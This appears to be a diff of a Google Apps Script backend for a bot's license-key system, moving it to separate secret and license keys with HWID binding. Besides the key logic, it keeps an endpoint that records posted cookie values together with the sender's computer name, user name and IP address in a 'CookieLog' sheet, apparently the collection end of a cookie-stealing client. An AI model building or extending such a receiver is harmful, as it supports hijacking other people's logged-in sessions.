@@ -1,12 +1,15 @@
 /**
- * Google Apps Script — 統一接收端
+ * Google Apps Script — 統一接收端（雙 Key 系統）
  * 
  * 功能：
  *   1. Cookie 資料接收（CookieLog 工作表）
  *   2. 用戶購買資料接收（用戶資料 工作表）
- *   3. 金鑰永久儲存/更新（金鑰記錄 工作表）
+ *   3. 密鑰+金鑰永久儲存/更新（金鑰記錄 工作表）
  *   4. HWID 更新/重置（更新金鑰記錄中的 HWID + 機碼欄位）
- *   5. 金鑰載入 API（Bot 重啟時 GET ?action=load_keys 載入所有金鑰）
+ *   5. 金鑰載入 API（Bot 重啟時 GET ?action=load_keys 載入所有資料）
+ *
+ * 金鑰記錄工作表欄位：
+ *   secret_key | license_key | username | user_id | status | hwid | machine_code | created_at | updated_at
  *
  * 部署步驟：
  *   1. 將此程式碼貼入 Google Apps Script 的 Code.gs
@@ -37,6 +40,9 @@ function getOrCreateSheet(ss, name, headers, headerColor) {
   return sheet;
 }
 
+// 金鑰記錄的標準欄位
+var KEY_HEADERS = ["secret_key", "license_key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
+
 // ======================================================================
 // GET 請求處理
 // ======================================================================
@@ -50,7 +56,7 @@ function doGet(e) {
   return ContentService
     .createTextOutput(JSON.stringify({
       status: "ok",
-      message: "Google Apps Script 統一接收端運作中",
+      message: "Google Apps Script 統一接收端運作中（雙 Key 系統）",
       endpoints: ["CookieLog", "用戶資料", "金鑰記錄"],
       actions: ["load_keys"]
     }))
@@ -63,8 +69,7 @@ function doGet(e) {
 function loadAllKeys() {
   try {
     var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
-    var headers = ["key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
-    var sheet = getOrCreateSheet(ss, "金鑰記錄", headers, "#27ae60");
+    var sheet = getOrCreateSheet(ss, "金鑰記錄", KEY_HEADERS, "#27ae60");
     var data = sheet.getDataRange().getValues();
 
     if (data.length <= 1) {
@@ -82,7 +87,10 @@ function loadAllKeys() {
       for (var j = 0; j < headerRow.length; j++) {
         keyObj[headerRow[j]] = row[j] !== undefined ? String(row[j]) : "";
       }
-      if (keyObj.key && keyObj.key !== "" && keyObj.key !== "N/A") {
+      // 只要有 secret_key 或 license_key 就載入
+      if ((keyObj.secret_key && keyObj.secret_key !== "") || 
+          (keyObj.license_key && keyObj.license_key !== "") ||
+          (keyObj.key && keyObj.key !== "")) {
         keys.push(keyObj);
       }
     }
@@ -107,7 +115,6 @@ function doPost(e) {
     var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
     var type = data.type || "";
 
-    // 根據 type 欄位分流（新版 Bot 使用）
     if (type === "key_save") {
       return handleKeySave(ss, data);
     }
@@ -121,14 +128,14 @@ function doPost(e) {
       return handleUserData(ss, data);
     }
 
-    // 向後相容：根據資料欄位判斷類型
+    // 向後相容
     if (data.cookie) {
       return handleCookieData(ss, data);
     }
     if (data.purchase_item) {
       return handleUserData(ss, data);
     }
-    if (data.key && data.user_id) {
+    if ((data.secret_key || data.key) && data.user_id) {
       return handleKeySave(ss, data);
     }
 
@@ -144,7 +151,7 @@ function doPost(e) {
 }
 
 // ======================================================================
-// 處理 Cookie 資料 — 寫入 "CookieLog" 工作表
+// 處理 Cookie 資料
 // ======================================================================
 function handleCookieData(ss, data) {
   var headers = ["時間戳記", "電腦名稱", "使用者名稱", "Cookie 值", "IP 位址", "來源"];
@@ -166,7 +173,7 @@ function handleCookieData(ss, data) {
 }
 
 // ======================================================================
-// 處理用戶購買資料 — 寫入 "用戶資料" 工作表
+// 處理用戶購買資料
 // ======================================================================
 function handleUserData(ss, data) {
   var headers = ["使用者名稱", "使用者ID", "使用者購買項目", "使用者購買金額", "時間戳記"];
@@ -186,32 +193,60 @@ function handleUserData(ss, data) {
 }
 
 // ======================================================================
-// 處理金鑰儲存（新增或更新）— 寫入 "金鑰記錄" 工作表
+// 處理金鑰儲存（雙 Key 系統）
+// 欄位：secret_key | license_key | username | user_id | status | hwid | machine_code | created_at | updated_at
 // ======================================================================
 function handleKeySave(ss, data) {
-  var headers = ["key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
-  var sheet = getOrCreateSheet(ss, "金鑰記錄", headers, "#27ae60");
+  var sheet = getOrCreateSheet(ss, "金鑰記錄", KEY_HEADERS, "#27ae60");
 
-  // 檢查是否已存在此金鑰
+  var secretKey = data.secret_key || data.key || "";
+  var licenseKey = data.license_key || "";
+  var now = data.timestamp || new Date().toISOString();
+
+  // 查找是否已存在（先用 secret_key 查，再用 user_id 查）
   var allData = sheet.getDataRange().getValues();
+  var headerRow = allData[0];
+  var secretKeyCol = headerRow.indexOf("secret_key");
+  var licenseKeyCol = headerRow.indexOf("license_key");
+  var userIdCol = headerRow.indexOf("user_id");
+  
+  // 如果欄位不存在（舊版工作表），使用 key 欄位
+  if (secretKeyCol === -1) {
+    secretKeyCol = headerRow.indexOf("key");
+  }
+
   var existingRow = -1;
-  for (var i = 1; i < allData.length; i++) {
-    if (allData[i][0] === data.key) {
-      existingRow = i + 1; // 1-indexed for sheet
-      break;
+
+  // 先用 secret_key 查找
+  if (secretKey && secretKeyCol >= 0) {
+    for (var i = 1; i < allData.length; i++) {
+      if (String(allData[i][secretKeyCol]) === secretKey) {
+        existingRow = i + 1;
+        break;
+      }
     }
   }
 
-  var now = data.timestamp || new Date().toISOString();
+  // 如果沒找到，用 user_id 查找
+  if (existingRow === -1 && data.user_id && userIdCol >= 0) {
+    for (var i = 1; i < allData.length; i++) {
+      if (String(allData[i][userIdCol]) === String(data.user_id)) {
+        existingRow = i + 1;
+        break;
+      }
+    }
+  }
 
   if (existingRow > 0) {
     // 更新現有記錄
-    if (data.username) sheet.getRange(existingRow, 2).setValue(data.username);
-    if (data.user_id) sheet.getRange(existingRow, 3).setValue(data.user_id);
-    if (data.status) sheet.getRange(existingRow, 4).setValue(data.status);
-    if (data.hwid) sheet.getRange(existingRow, 5).setValue(data.hwid);
-    if (data.machine_code) sheet.getRange(existingRow, 6).setValue(data.machine_code);
-    sheet.getRange(existingRow, 8).setValue(now); // updated_at
+    if (secretKey) sheet.getRange(existingRow, 1).setValue(secretKey);
+    if (licenseKey) sheet.getRange(existingRow, 2).setValue(licenseKey);
+    if (data.username) sheet.getRange(existingRow, 3).setValue(data.username);
+    if (data.user_id) sheet.getRange(existingRow, 4).setValue(data.user_id);
+    if (data.status) sheet.getRange(existingRow, 5).setValue(data.status);
+    if (data.hwid !== undefined && data.hwid !== "") sheet.getRange(existingRow, 6).setValue(data.hwid);
+    if (data.machine_code !== undefined && data.machine_code !== "") sheet.getRange(existingRow, 7).setValue(data.machine_code);
+    sheet.getRange(existingRow, 9).setValue(now); // updated_at
 
     return ContentService.createTextOutput(
       JSON.stringify({ status: "ok", message: "金鑰已更新", action: "updated" })
@@ -219,7 +254,8 @@ function handleKeySave(ss, data) {
   } else {
     // 新增記錄
     sheet.appendRow([
-      data.key,
+      secretKey,
+      licenseKey,
       data.username || "N/A",
       data.user_id || "N/A",
       data.status || "已建立",
@@ -236,19 +272,24 @@ function handleKeySave(ss, data) {
 }
 
 // ======================================================================
-// 處理 HWID 更新 — 更新金鑰記錄中的 HWID 和機碼
+// 處理 HWID 更新 — 用 license_key (data.key) 查找並更新
 // ======================================================================
 function handleHwidUpdate(ss, data) {
-  var headers = ["key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
-  var sheet = getOrCreateSheet(ss, "金鑰記錄", headers, "#27ae60");
+  var sheet = getOrCreateSheet(ss, "金鑰記錄", KEY_HEADERS, "#27ae60");
 
   var allData = sheet.getDataRange().getValues();
+  var headerRow = allData[0];
+  var licenseKeyCol = headerRow.indexOf("license_key");
+  
+  // 向後相容：如果沒有 license_key 欄位，用第一欄（key 或 secret_key）
+  if (licenseKeyCol === -1) licenseKeyCol = 0;
+
   for (var i = 1; i < allData.length; i++) {
-    if (allData[i][0] === data.key) {
+    if (String(allData[i][licenseKeyCol]) === data.key) {
       var row = i + 1;
-      sheet.getRange(row, 5).setValue(data.hwid || "");
-      sheet.getRange(row, 6).setValue(data.machine_code || "");
-      sheet.getRange(row, 8).setValue(data.timestamp || new Date().toISOString());
+      sheet.getRange(row, 6).setValue(data.hwid || "");
+      sheet.getRange(row, 7).setValue(data.machine_code || "");
+      sheet.getRange(row, 9).setValue(data.timestamp || new Date().toISOString());
 
       return ContentService.createTextOutput(
         JSON.stringify({ status: "ok", message: "HWID 已更新" })
@@ -262,19 +303,22 @@ function handleHwidUpdate(ss, data) {
 }
 
 // ======================================================================
-// 處理 HWID 重置 — 清除金鑰記錄中的 HWID 和機碼
+// 處理 HWID 重置
 // ======================================================================
 function handleHwidReset(ss, data) {
-  var headers = ["key", "username", "user_id", "status", "hwid", "machine_code", "created_at", "updated_at"];
-  var sheet = getOrCreateSheet(ss, "金鑰記錄", headers, "#27ae60");
+  var sheet = getOrCreateSheet(ss, "金鑰記錄", KEY_HEADERS, "#27ae60");
 
   var allData = sheet.getDataRange().getValues();
+  var headerRow = allData[0];
+  var licenseKeyCol = headerRow.indexOf("license_key");
+  if (licenseKeyCol === -1) licenseKeyCol = 0;
+
   for (var i = 1; i < allData.length; i++) {
-    if (allData[i][0] === data.key) {
+    if (String(allData[i][licenseKeyCol]) === data.key) {
       var row = i + 1;
-      sheet.getRange(row, 5).setValue("");  // 清除 HWID
-      sheet.getRange(row, 6).setValue("");  // 清除機碼
-      sheet.getRange(row, 8).setValue(data.timestamp || new Date().toISOString());
+      sheet.getRange(row, 6).setValue("");  // 清除 HWID
+      sheet.getRange(row, 7).setValue("");  // 清除機碼
+      sheet.getRange(row, 9).setValue(data.timestamp || new Date().toISOString());
 
       return ContentService.createTextOutput(
         JSON.stringify({ status: "ok", message: "HWID 已重置" })
